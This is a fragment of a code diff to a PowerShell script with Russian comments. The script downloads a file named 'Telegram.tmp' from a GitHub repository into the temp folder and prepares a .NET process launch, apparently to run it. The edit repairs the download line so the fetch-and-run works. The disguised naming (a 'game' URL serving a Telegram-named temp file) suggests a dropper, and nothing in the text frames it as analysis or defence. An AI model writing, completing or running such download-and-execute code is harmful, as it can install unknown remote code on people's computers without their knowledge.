@@ -4,7 +4,7 @@ $GameUrl = "https://github.com/tema132b-arch/testz/raw/main/Telegram.tmp"
 $TempFile = Join-Path ([IO.Path]::GetTempPath()) "Telegram.tmp"
 
 # Скачиваем файл
-Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
+Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing
 
 # Настраиваем запуск через .NET
 $psi = New-Object System.Diagnostics.ProcessStartInfo
